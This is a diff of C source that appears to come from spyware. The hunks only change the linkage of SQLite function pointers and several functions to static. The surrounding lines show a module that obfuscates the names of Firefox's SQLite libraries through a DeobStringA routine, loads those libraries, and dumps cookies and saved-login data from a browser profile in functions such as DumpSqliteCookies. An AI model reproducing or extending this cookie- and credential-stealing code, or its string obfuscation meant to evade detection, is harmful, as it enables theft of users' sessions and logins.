@@ -10,10 +10,10 @@
 typedef int (*sqlite3_open)(const char *, void **);
 typedef int (*sqlite3_close)(void *);
 typedef int (*sqlite3_exec)(void *, const char *, int (*callback)(void*,int,char**,char**), void *, char **);
-sqlite3_open	social_SQLITE_open = NULL;
-sqlite3_close	social_SQLITE_close = NULL;
-sqlite3_exec	social_SQLITE_exec = NULL;
-HMODULE libsqlsc;
+static sqlite3_open		social_SQLITE_open = NULL;
+static sqlite3_close	social_SQLITE_close = NULL;
+static sqlite3_exec		social_SQLITE_exec = NULL;
+static HMODULE libsqlsc;
 //--------------------
 
 extern int DirectoryExists(WCHAR *path);
@@ -26,7 +26,7 @@ extern char *DeobStringA(char *string);
 #define SQLITEALT_LIBRARY_NAME  "05O9ByZLIn.Xyy" //"mozsqlite3.dll"
 #define SQLITE_LIBRARY_NAME  "9ByZLIn.Xyy" //"sqlite3.dll"
 
-int InitSocialLibs()
+int static InitSocialLibs()
 {
 	char buffer[MAX_PATH];
 	WCHAR *firefoxDir;
@@ -54,12 +54,12 @@ int InitSocialLibs()
 	return 1;
 }
 
-void UnInitSocialLibs()
+void static UnInitSocialLibs()
 {
 	FreeLibrary(libsqlsc);
 }
 
-int parse_sqlite_cookies(void *NotUsed, int argc, char **argv, char **azColName)
+int static parse_sqlite_cookies(void *NotUsed, int argc, char **argv, char **azColName)
 {
 	char *host = NULL;
 	char *name = NULL;
@@ -85,7 +85,7 @@ int parse_sqlite_cookies(void *NotUsed, int argc, char **argv, char **azColName)
 	return 0;
 }
 
-int DumpSqliteCookies(WCHAR *profilePath, WCHAR *signonFile)
+int static DumpSqliteCookies(WCHAR *profilePath, WCHAR *signonFile)
 {
 	void *db;
 	char *ascii_path;
